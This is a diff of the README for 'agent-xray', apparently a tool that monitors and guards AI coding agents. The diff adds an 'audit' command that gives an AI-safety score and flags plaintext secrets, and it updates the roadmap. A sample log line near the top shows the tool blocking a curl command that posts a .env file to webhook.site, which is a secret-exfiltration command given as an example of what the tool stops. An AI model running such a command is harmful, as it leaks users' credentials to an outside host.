@@ -9,7 +9,23 @@
 18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
 ```
 
-> Status: **v0.5** — multi-agent (Claude Code, ZCode, Cursor), observe/guard modes, tamper seal, **sweep** (finds AI-agent leftovers on the machine), live 3D dashboard. Zero runtime dependencies. Node 18+.
+> Status: **v0.6** — multi-agent (Claude Code, ZCode, Cursor), observe/guard modes, tamper seal, **sweep** (AI-agent leftovers), **audit** (one-command AI-safety score + HTML report), live 3D dashboard. Zero runtime dependencies. Node 18+.
+
+## Audit: your computer's AI Safety Score in one command
+
+```bash
+agent-xray audit
+```
+
+Runs the full checkup and writes a self-contained HTML report to `~/.agent-xray/audit/latest.html` (opens automatically on macOS):
+
+- **AI Safety Score 0-100** with a letter grade and an exact score breakdown;
+- parasites and exposed services (the sweep findings);
+- **plaintext secrets in agent configs** (AWS/GitHub/Google/Slack-shaped keys, private key blocks) — expected credential files are reported separately, values are always masked;
+- X-ray coverage of every installed agent, current mode and tamper-seal state;
+- concrete recommendations, each one a single command.
+
+Re-run after fixing to watch the score climb.
 
 ## Sweep: find the parasites AI agents left behind
 
@@ -132,7 +148,7 @@ agent-xray is a **guardrail and a window, not a sandbox.**
 - [ ] Local HTTP(S) proxy (domain-level network visibility for any agent)
 - [x] Web dashboard on localhost
 - [ ] README badge + shareable session report
-- [ ] Sweep results in the web dashboard
+- [ ] Sweep + audit results in the web dashboard
 - [ ] OS-level strict mode (eBPF / seccomp on Linux)
 - [x] Claude Code + ZCode + Cursor (hook APIs); proxy mode for the rest
 
